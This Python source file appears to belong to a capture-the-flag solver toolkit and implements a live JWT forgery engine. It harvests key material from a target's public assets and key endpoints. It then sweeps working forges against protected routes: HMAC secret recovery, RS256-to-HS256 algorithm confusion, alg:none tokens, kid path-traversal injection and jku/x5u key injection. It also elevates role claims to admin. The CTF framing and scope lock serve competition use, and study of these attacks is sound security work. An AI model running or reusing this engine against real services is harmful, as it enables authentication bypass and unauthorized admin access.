#!/usr/bin/env python3
"""Live JWT forge engine (B-019): a fastlane-callable attack catalogue for JWT auth.

The engine reads a JSON Web Token from a live target, harvests candidate key bytes from the
target's public assets and key endpoints, and sweeps a bounded catalogue of forges against a
protected route, stopping on the first response that contains a flag:

  * HS256 secret recovery -- verify the issued token's HMAC against bytes harvested from public
    assets, common secrets, and words/lines in those assets; on a hit, forge an elevated token.
  * RS256 -> HS256 algorithm confusion -- sign HS256 using the server's own RSA public key bytes
    (PEM / JWKS) as the HMAC secret (the classic asymmetric-to-symmetric confusion).
  * ``alg: none`` -- drop the signature with the ``none``/``None``/``NONE`` spellings.
  * ``kid`` injection -- point ``kid`` at a public asset whose bytes are known (path-traversal
    spellings) or at ``/dev/null`` with an empty key, then sign HS256 with those bytes.
  * ``jku`` / ``x5u`` injection -- only when the caller names an in-scope URL it controls
    (``jku_url`` / ``x5u_url``): mint an RSA key pair, emit the JWKS/cert for the operator to host
    there, and sign RS256 with the matching private key.

Every request goes through the scope-locked :class:`web.WebClient`: it stays on the one target the
caller passes, refuses the event platform, and stops (``blocked``) when the target cannot be reached.
Nothing is auto-submitted; a recovered flag is returned in the ``SolverResult`` for the player.

Entry: ``solve(challenge_dir, profile, *, target=..., ...) -> SolverResult`` (CONTRACTS.md 6-7).
The pure forge/harvest helpers below carry no I/O and are unit-tested offline.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import time
from pathlib import Path
from typing import Iterable, Iterator

# The scope-locked live HTTP client (toolkits/web.py is the flat owner of the ``web`` basename on the
# engine sys.path). Imported lazily inside solve() so the pure helpers import with no side effects.

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*")

# Secrets seen again and again on weak-key JWT challenges. Kept small and generic (no event names).
COMMON_SECRETS: tuple[bytes, ...] = (
    b"", b"secret", b"secretkey", b"secret_key", b"changeme", b"password", b"admin", b"key",
    b"jwt", b"jwtsecret", b"jwt_secret", b"supersecret", b"your-256-bit-secret", b"hs256",
    b"private", b"signing_key", b"s3cr3t", b"test", b"dev",
)

_HMAC_DIGEST = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
_NONE_SPELLINGS = ("none", "None", "NONE", "nOnE")
# Elevatable role words and the claim names that commonly gate admin access.
_ROLE_WORDS = {"analyst", "user", "guest", "viewer", "operator", "member", "reader", "staff"}
_ADMIN_FLAGS = {"admin", "is_admin", "isadmin", "is_staff", "superuser"}

MAX_KEY_CANDIDATES = 4000
MAX_HARVEST_BYTES = 512 * 1024


class JwtForgeError(ValueError):
    """A supplied token or key is malformed."""


# --------------------------------------------------------------------------------------------------
#  base64url + JWT codec (pure)
# --------------------------------------------------------------------------------------------------
def b64u_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def b64u_decode(seg: str) -> bytes:
    seg = seg.strip()
    pad = "=" * (-len(seg) % 4)
    try:
        return base64.urlsafe_b64decode(seg + pad)
    except (ValueError, base64.binascii.Error) as exc:  # type: ignore[attr-defined]
        raise JwtForgeError(f"not base64url: {seg[:40]!r}") from exc


def find_jwt(text: str) -> str | None:
    """The first ``header.payload.signature`` JWT in a response body or Set-Cookie value."""
    m = JWT_RE.search(text)
    return m.group(0) if m else None


def decode_jwt(token: str) -> tuple[dict, dict, bytes, bytes]:
    """``(header, payload, signing_input, signature_bytes)`` for a compact JWS. Raises on malformed."""
    parts = token.split(".")
    if len(parts) != 3:
        raise JwtForgeError(f"a compact JWT has three dot-separated parts; got {len(parts)}")
    h_seg, p_seg, s_seg = parts
    try:
        header = json.loads(b64u_decode(h_seg))
        payload = json.loads(b64u_decode(p_seg))
    except (json.JSONDecodeError, UnicodeDecodeError) as exc:
        raise JwtForgeError(f"JWT header/payload is not JSON: {exc}") from exc
    if not isinstance(header, dict) or not isinstance(payload, dict):
        raise JwtForgeError("JWT header and payload must be JSON objects")
    signing_input = f"{h_seg}.{p_seg}".encode("ascii")
    return header, payload, signing_input, b64u_decode(s_seg)


# --------------------------------------------------------------------------------------------------
#  signing + forging (pure)
# --------------------------------------------------------------------------------------------------
def _encode_segment(obj: dict) -> str:
    return b64u_encode(json.dumps(obj, separators=(",", ":")).encode("utf-8"))


def sign_hs(header: dict, payload: dict, key: bytes, alg: str = "HS256") -> str:
    """A compact HS256/384/512 JWS over ``header`` and ``payload`` with ``key``."""
    digest = _HMAC_DIGEST.get(alg)
    if digest is None:
        raise JwtForgeError(f"not an HMAC alg: {alg!r}")
    hdr = dict(header)
    hdr["alg"] = alg
    signing_input = f"{_encode_segment(hdr)}.{_encode_segment(payload)}".encode("ascii")
    sig = hmac.new(key, signing_input, digest).digest()
    return f"{signing_input.decode('ascii')}.{b64u_encode(sig)}"


def forge_none(header: dict, payload: dict, spelling: str = "none") -> str:
    """An ``alg: none`` token with an empty signature segment."""
    hdr = dict(header)
    hdr["alg"] = spelling
    return f"{_encode_segment(hdr)}.{_encode_segment(payload)}."


def verify_hs(signing_input: bytes, signature: bytes, alg: str, key: bytes) -> bool:
    digest = _HMAC_DIGEST.get(alg)
    if digest is None:
        return False
    return hmac.compare_digest(hmac.new(key, signing_input, digest).digest(), signature)


def recover_hmac_key(signing_input: bytes, signature: bytes, alg: str,
                     candidates: Iterable[bytes]) -> bytes | None:
    """The first candidate whose HMAC over ``signing_input`` equals the issued ``signature``."""
    if alg not in _HMAC_DIGEST:
        return None
    seen: set[bytes] = set()
    for key in candidates:
        if key in seen:
            continue
        seen.add(key)
        if verify_hs(signing_input, signature, alg, key):
            return key
    return None


# --------------------------------------------------------------------------------------------------
#  key-byte harvesting (pure)
# --------------------------------------------------------------------------------------------------
def harvest_key_candidates(blobs: Iterable[bytes], *, extra: Iterable[bytes] = ()) -> list[bytes]:
    """Candidate HMAC keys drawn from public-asset bytes: the raw blob and trimmed variants, its
    sha256 (digest + hex), and every printable word and line, plus the common secrets.

    Deterministic order and de-duplicated, capped at :data:`MAX_KEY_CANDIDATES`.
    """
    out: list[bytes] = []
    seen: set[bytes] = set()

    def add(k: bytes) -> None:
        if k is None or k in seen or len(out) >= MAX_KEY_CANDIDATES:
            return
        seen.add(k)
        out.append(k)

    for k in COMMON_SECRETS:
        add(k)
    for k in extra:
        add(bytes(k))
    for blob in blobs:
        if not blob:
            continue
        blob = bytes(blob[:MAX_HARVEST_BYTES])
        add(blob)
        add(blob.strip())
        add(blob.rstrip(b"\n"))
        add(blob.rstrip(b"\r\n"))
        add(hashlib.sha256(blob).digest())
        add(hashlib.sha256(blob).hexdigest().encode("ascii"))
        add(hashlib.sha256(blob.strip()).digest())
        for word in re.findall(rb"[\x21-\x7e]{3,128}", blob):
            add(word)
            add(word.strip(b"\"',;:"))
        for line in blob.splitlines():
            add(line.strip())
        if len(out) >= MAX_KEY_CANDIDATES:
            break
    return out


# --------------------------------------------------------------------------------------------------
#  claim elevation (pure)
# --------------------------------------------------------------------------------------------------
def elevate_claims(payload: dict, *, now: int | None = None) -> dict:
    """A copy of ``payload`` nudged toward admin: role words -> ``admin``, admin flags -> true,
    and ``exp``/``iat``/``nbf`` refreshed so the forged token is temporally valid."""
    now = int(time.time()) if now is None else int(now)
    out = dict(payload)
    changed = False
    for key, val in list(out.items()):
        kl = key.lower()
        if isinstance(val, str) and val.lower() in _ROLE_WORDS:
            out[key] = "admin"
            changed = True
        elif isinstance(val, list) and any(isinstance(x, str) and x.lower() in _ROLE_WORDS for x in val):
            out[key] = ["admin"]
            changed = True
        elif kl in _ADMIN_FLAGS and val in (False, 0, "false", "False", None):
            out[key] = True
            changed = True
    if not changed:
        out["role"] = "admin"
    if "exp" in out:
        out["exp"] = now + 3600
    if "iat" in out:
        out["iat"] = now - 5
    if "nbf" in out:
        out["nbf"] = now - 5
    return out


# --------------------------------------------------------------------------------------------------
#  forge catalogue (pure): each yields (label, token)
# --------------------------------------------------------------------------------------------------
def rs256_to_hs256_tokens(header: dict, payload: dict,
                          public_key_blobs: Iterable[bytes]) -> Iterator[tuple[str, str]]:
    """RS256 -> HS256 confusion: sign HS256 using the server's public-key bytes as the secret."""
    seen: set[bytes] = set()
    for blob in public_key_blobs:
        if not blob:
            continue
        for variant, key in (("raw", bytes(blob)), ("strip", bytes(blob).strip()),
                             ("nl", bytes(blob).strip() + b"\n")):
            if key in seen:
                continue
            seen.add(key)
            yield f"rs256->hs256:{variant}", sign_hs(header, payload, key, "HS256")


def alg_none_tokens(header: dict, payload: dict) -> Iterator[tuple[str, str]]:
    for spelling in _NONE_SPELLINGS:
        yield f"alg=none:{spelling}", forge_none(header, payload, spelling)


def kid_injection_tokens(header: dict, payload: dict,
                         assets: dict[str, bytes]) -> Iterator[tuple[str, str]]:
    """``kid`` path injection: ``/dev/null`` with an empty key, and known-byte assets referenced
    through several traversal spellings and signed HS256 with those bytes."""
    yield "kid=/dev/null", sign_hs({**header, "kid": "/dev/null"}, payload, b"", "HS256")
    for path, data in list(assets.items())[:4]:
        rel = path.lstrip("/")
        name = rel.rsplit("/", 1)[-1]
        spellings = (rel, "/" + rel, "../" + rel, "../../" + rel, "../../../" + rel,
                     "/app/" + rel, "./" + rel, "../public/" + name)
        keys = (data,) if data.strip() == data else (data, data.strip())
        for kp in spellings:
            for key in keys:
                yield f"kid={kp}", sign_hs({**header, "kid": kp}, payload, bytes(key), "HS256")


def jku_x5u_tokens(header: dict, payload: dict, *, jku_url: str | None,
                   x5u_url: str | None) -> tuple[list[tuple[str, str]], dict]:
    """Mint an RSA key pair, sign RS256 with it, and point ``jku``/``x5u`` at an operator-hosted URL.

    Returns ``(attempts, published)`` where ``published`` carries the JWKS JSON and PEM bytes the
    operator must host at ``jku_url`` / ``x5u_url`` for the forge to verify. Requires ``cryptography``
    (a repo dependency); the caller surfaces a named ``blocked`` note when it is missing.
    """
    from cryptography.hazmat.primitives import serialization, hashes
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    import datetime as _dt

    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub = priv.public_key()
    numbers = pub.public_numbers()

    def _b64u_uint(value: int) -> str:
        raw = value.to_bytes((value.bit_length() + 7) // 8 or 1, "big")
        return b64u_encode(raw)

    kid = "forge-" + hashlib.sha256(_b64u_uint(numbers.n).encode()).hexdigest()[:16]
    jwk = {"kty": "RSA", "use": "sig", "alg": "RS256", "kid": kid,
           "n": _b64u_uint(numbers.n), "e": _b64u_uint(numbers.e)}
    jwks = {"keys": [jwk]}
    pub_pem = pub.public_bytes(serialization.Encoding.PEM,
                               serialization.PublicFormat.SubjectPublicKeyInfo)

    def _rs256(hdr: dict) -> str:
        h = dict(hdr)
        h["alg"] = "RS256"
        h["kid"] = kid
        signing_input = f"{_encode_segment(h)}.{_encode_segment(payload)}".encode("ascii")
        sig = priv.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
        return f"{signing_input.decode('ascii')}.{b64u_encode(sig)}"

    attempts: list[tuple[str, str]] = []
    published: dict = {"kid": kid, "jwks": json.dumps(jwks), "public_pem": pub_pem.decode("ascii")}
    if jku_url:
        attempts.append((f"jku={jku_url}", _rs256({**header, "jku": jku_url})))
    if x5u_url:
        subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "forge")])
        now = _dt.datetime.now(_dt.timezone.utc)
        cert = (x509.CertificateBuilder().subject_name(subject).issuer_name(subject)
                .public_key(pub).serial_number(x509.random_serial_number())
                .not_valid_before(now - _dt.timedelta(days=1))
                .not_valid_after(now + _dt.timedelta(days=365))
                .sign(priv, hashes.SHA256()))
        published["x5u_pem"] = cert.public_bytes(serialization.Encoding.PEM).decode("ascii")
        attempts.append((f"x5u={x5u_url}", _rs256({**header, "x5u": x5u_url})))
    return attempts, published


# --------------------------------------------------------------------------------------------------
#  discovery helpers (pure parsing of fetched bytes)
# --------------------------------------------------------------------------------------------------
_ASSET_REF = re.compile(rb"""(?:href|src)=["']([^"']+)["']""")
_PUBLIC_REF = re.compile(rb"(/(?:public|static|assets)/[A-Za-z0-9_\-./%]+)")
_KEY_REF = re.compile(rb"(/[A-Za-z0-9_\-./%]*(?:\.pem|\.key|\.crt|jwks[^\"'\s]*|openid-configuration))")


def discover_paths(blob: bytes) -> list[str]:
    """In-scope asset/key paths referenced by a fetched body (absolute-rooted, de-duplicated)."""
    found: list[str] = []
    seen: set[str] = set()

    def add(p: str) -> None:
        p = p.rstrip(".,;)\"'")
        if not p.startswith("/") or p in seen or "://" in p:
            return
        seen.add(p)
        found.append(p)

    for m in _PUBLIC_REF.finditer(blob):
        add(m.group(1).decode("latin-1"))
    for m in _KEY_REF.finditer(blob):
        add(m.group(1).decode("latin-1"))
    for m in _ASSET_REF.finditer(blob):
        ref = m.group(1).decode("latin-1")
        if ref.startswith("/") and not ref.startswith("//"):
            add(ref)
    return found


def jwks_public_blobs(blob: bytes) -> list[bytes]:
    """RSA public-key byte strings derived from a JWKS document, for HS256 confusion candidates.

    Yields the modulus bytes and the raw ``n`` base64url string, which some confused verifiers feed
    to HMAC directly. Returns ``[]`` for non-JWKS bytes.
    """
    try:
        doc = json.loads(blob)
    except (json.JSONDecodeError, UnicodeDecodeError, TypeError):
        return []
    keys = doc.get("keys") if isinstance(doc, dict) else None
    if not isinstance(keys, list):
        return []
    out: list[bytes] = []
    for jwk in keys:
        if not isinstance(jwk, dict) or jwk.get("kty") != "RSA":
            continue
        n = jwk.get("n")
        if isinstance(n, str):
            out.append(n.encode("ascii"))
            try:
                out.append(b64u_decode(n))
            except JwtForgeError:
                pass
    return out


# --------------------------------------------------------------------------------------------------
#  live orchestration
# --------------------------------------------------------------------------------------------------
DEFAULT_RECON_PATHS = ("/", "/token", "/login", "/auth", "/api/token", "/schema",
                       "/public/", "/.well-known/jwks.json", "/.well-known/openid-configuration")
DEFAULT_PROTECTED_PATHS = ("/admin/flag", "/admin", "/flag", "/api/admin")
DEFAULT_KEY_PATHS = ("/.well-known/jwks.json", "/.well-known/kestrel-id.pem", "/jwks.json",
                     "/public.pem", "/key.pem")
MAX_ASSET_FETCH = 24


def _as_list(value, default: tuple[str, ...]) -> list[str]:
    if value is None:
        return list(default)
    if isinstance(value, str):
        return [value]
    return [str(v) for v in value]


def solve(challenge_dir, profile, *, target: str | None = None, token: str | None = None,
          recon_paths=None, protected_paths=None, key_paths=None, transport: str = "auto",
          cookie_name: str | None = None, max_requests: int = 80,
          jku_url: str | None = None, x5u_url: str | None = None, **_opts):
    """Sweep the JWT forge catalogue against a live target, stopping on the first flag.

    ``target`` is the one assigned base URL (required). ``token`` short-circuits recon with a known
    JWT. Opts tune the recon/protected/key path lists, the transport (``bearer``/``cookie``/``auto``)
    and the request cap. ``jku_url``/``x5u_url`` name an in-scope URL the operator hosts for those
    forges. Returns ``solved`` (flag + evidence), ``none`` (swept, nothing), ``unsure`` (no token
    found) or ``blocked`` (no target / unreachable / out of scope).
    """
    import web as _web  # the scope-locked WebClient (flat owner: solvers/toolkits/web.py)
    from ctf.result import SolverResult, Evidence, Cost
    from ctf import flagfmt

    started = time.time()
    eid = "web.jwt_forge_live"
    if not target:
        return SolverResult(status="blocked", engine=eid,
                            notes="no target: pass --opt target=http://host:port (the one assigned "
                                  "JWT-authenticated web target).")
    ff = flagfmt.for_profile(profile)

    def flags_in(data) -> list[str]:
        if not data:
            return []
        found = ff.find_flags(data)
        return [f for f in found if f]

    try:
        client = _web.WebClient(target)
        send_client = _web.WebClient(target)
    except _web.OutOfScope as exc:
        return SolverResult(status="blocked", engine=eid,
                            notes=f"target out of scope: {exc}")

    budget = {"n": 0}
    evidence: list[Evidence] = []

    def _cost() -> Cost:
        return Cost(seconds=round(time.time() - started, 3))

    def get(path: str):
        if budget["n"] >= max_requests:
            return None
        budget["n"] += 1
        try:
            return client.get(path)
        except (_web.VPNRequired, _web.OutOfScope, ValueError):
            return None

    def send(path: str, tok: str, how: str, cname: str):
        if budget["n"] >= max_requests:
            return None
        budget["n"] += 1
        send_client.clear_cookies()  # no recon cookie leaks into the forged-token request
        if how == "bearer":
            headers = {"Authorization": f"Bearer {tok}"}
        else:
            headers = {"Cookie": f"{cname}={tok}"}
        try:
            return send_client.request("GET", path, headers=headers)
        except (_web.VPNRequired, _web.OutOfScope, ValueError):
            return None

    recon = _as_list(recon_paths, DEFAULT_RECON_PATHS)
    protected = _as_list(protected_paths, DEFAULT_PROTECTED_PATHS)
    keys_ep = _as_list(key_paths, DEFAULT_KEY_PATHS)

    # ---- 1. recon: find a token, harvest asset/key bytes, note the cookie name -------------------
    blobs: list[bytes] = []
    assets: dict[str, bytes] = {}
    pub_blobs: list[bytes] = []
    issued = token
    found_cookie = cookie_name
    discovered: list[str] = []
    reached = False

    for path in recon:
        resp = get(path)
        if resp is None:
            continue
        reached = True
        body = resp.get("body") or b""
        if flags_in(body):
            fl = flags_in(body)
            evidence.append(Evidence(kind="http", detail=f"flag in GET {path} body"))
            return SolverResult(status="solved", flags=tuple(fl), evidence=tuple(evidence),
                                engine=eid, cost=_cost(),
                                notes=f"flag served unauthenticated at {path}")
        blobs.append(body)
        if resp.get("status") == 200 and body:
            assets[path] = body
        discovered.extend(discover_paths(body))
        pub_blobs.extend(jwks_public_blobs(body))
        if issued is None:
            issued = find_jwt(body.decode("latin-1"))
        for name, value in resp.get("response_header_pairs") or []:
            if name.lower() == "set-cookie":
                tok = find_jwt(value)
                if tok and issued is None:
                    issued = tok
                if tok:
                    found_cookie = found_cookie or value.split("=", 1)[0].strip()

    if not reached:
        return SolverResult(status="blocked", engine=eid, cost=_cost(),
                            notes=f"target {target} did not answer any recon path "
                                  f"({', '.join(recon[:4])} ...); check the instance is up / in scope.")

    # ---- 2. fetch key endpoints and a few discovered assets --------------------------------------
    for path in keys_ep:
        if path in assets:
            continue
        resp = get(path)
        if resp is None:
            continue
        body = resp.get("body") or b""
        if resp.get("status") == 200 and body:
            assets[path] = body
            blobs.append(body)
            pub_blobs.extend(jwks_public_blobs(body))
            if b"BEGIN" in body and (b"KEY" in body or b"CERTIFICATE" in body):
                pub_blobs.append(body)

    for path in list(dict.fromkeys(discovered))[:MAX_ASSET_FETCH]:
        if path in assets or budget["n"] >= max_requests:
            continue
        resp = get(path)
        if resp is None:
            continue
        body = resp.get("body") or b""
        if resp.get("status") == 200 and body:
            assets[path] = body
            blobs.append(body)
            if b"BEGIN" in body and (b"KEY" in body or b"CERTIFICATE" in body):
                pub_blobs.append(body)

    if not issued:
        return SolverResult(status="unsure", engine=eid, cost=_cost(),
                            notes="no JWT found on the recon paths; pass --opt token=<jwt> or "
                                  "--opt recon_paths='[\"/path\"]' naming where the token is issued.")

    try:
        header, payload, signing_input, signature = decode_jwt(issued)
    except JwtForgeError as exc:
        return SolverResult(status="unsure", engine=eid, cost=_cost(),
                            notes=f"token discovered but not a decodable JWT: {exc}")

    alg = str(header.get("alg", "")) or "HS256"
    elevated = elevate_claims(payload)
    cname = found_cookie or "session"

    # ---- 3. lock transport + the responding protected path with the issued token -----------------
    # Narrow to the protected path(s) that actually answer (not 404/connection error): every forge
    # then costs one request, not one per candidate path, so the sweep stays inside max_requests.
    modes = ["bearer", "cookie"] if transport == "auto" else [transport]
    locked = modes[0]
    live_protected: list[str] = []
    for path in protected:
        answered = False
        for how in modes:
            resp = send(path, issued, how, cname)
            if resp is None:
                continue
            if flags_in(resp.get("body")):
                fl = flags_in(resp.get("body"))
                evidence.append(Evidence(kind="http", detail=f"flag with issued token ({how}) at {path}"))
                return SolverResult(status="solved", flags=tuple(fl), evidence=tuple(evidence),
                                    engine=eid, cost=_cost(),
                                    notes="the issued token already reaches the protected route")
            status = resp.get("status")
            if status == 404:
                continue
            answered = True
            if status not in (401, 403):
                locked = how  # this transport is read by the server
        if answered:
            live_protected.append(path)
    targets = live_protected or protected

    # ---- 4. the forge catalogue, stopping on the first flag --------------------------------------
    def attempt(label: str, tok: str):
        for path in targets:
            if budget["n"] >= max_requests:
                return None
            resp = send(path, tok, locked, cname)
            if resp is None:
                return None
            if flags_in(resp.get("body")):
                fl = flags_in(resp.get("body"))
                evidence.append(Evidence(kind="forge",
                                         detail=f"{label} accepted at {path} (status {resp.get('status')})"))
                return SolverResult(status="solved", flags=tuple(fl), evidence=tuple(evidence),
                                    engine=eid, cost=_cost(),
                                    notes=f"forged token via {label}; token header alg was {alg}")
        return None

    # Cheap, high-signal forges first (a few requests each); the broad kid sweep last so an early
    # alg=none / confusion win is never starved by the request cap.
    # 4a. HS256 secret recovery against the issued token.
    if alg in _HMAC_DIGEST:
        candidates = harvest_key_candidates(blobs, extra=[signing_input, signature])
        key = recover_hmac_key(signing_input, signature, alg, candidates)
        if key is not None:
            evidence.append(Evidence(kind="key",
                                     detail=f"recovered {alg} key ({len(key)} bytes) from public assets"))
            res = attempt(f"hs-key-recovery ({len(key)}B)", sign_hs(header, elevated, key, alg))
            if res is not None:
                return res

    # 4b. RS256 -> HS256 confusion with the server's public key bytes.
    for label, tok in rs256_to_hs256_tokens(header, elevated, pub_blobs):
        res = attempt(label, tok)
        if res is not None:
            return res

    # 4c. alg=none.
    for label, tok in alg_none_tokens(header, elevated):
        res = attempt(label, tok)
        if res is not None:
            return res

    # 4d. kid injection (the broad sweep: many spellings).
    for label, tok in kid_injection_tokens(header, elevated, assets):
        if budget["n"] >= max_requests:
            break
        res = attempt(label, tok)
        if res is not None:
            return res

    # 4e. jku / x5u -- only when the operator named an in-scope URL it hosts.
    jku_note = ""
    if jku_url or x5u_url:
        try:
            attempts, published = jku_x5u_tokens(header, elevated, jku_url=jku_url, x5u_url=x5u_url)
            jku_note = (f" jku/x5u: host this JWKS at {jku_url or x5u_url} -> "
                        f"kid={published['kid']}")
            for label, tok in attempts:
                res = attempt(label, tok)
                if res is not None:
                    return res
        except ImportError:
            jku_note = " jku/x5u requested but 'cryptography' is not installed (pip install cryptography)."

    return SolverResult(status="none", engine=eid, cost=_cost(),
                        notes=(f"swept the JWT forge catalogue ({budget['n']} requests, alg={alg}) "
                               f"against {', '.join(protected[:3])}; no flag." + jku_note))


if __name__ == "__main__":  # manual: python solvers/web/jwt_forge_live.py <target> [cookie_name]
    import sys
    from ctf import event as _event
    tgt = sys.argv[1] if len(sys.argv) > 1 else None
    cn = sys.argv[2] if len(sys.argv) > 2 else None
    r = solve(Path("."), _event.current(), target=tgt, cookie_name=cn)
    print(r.to_json())
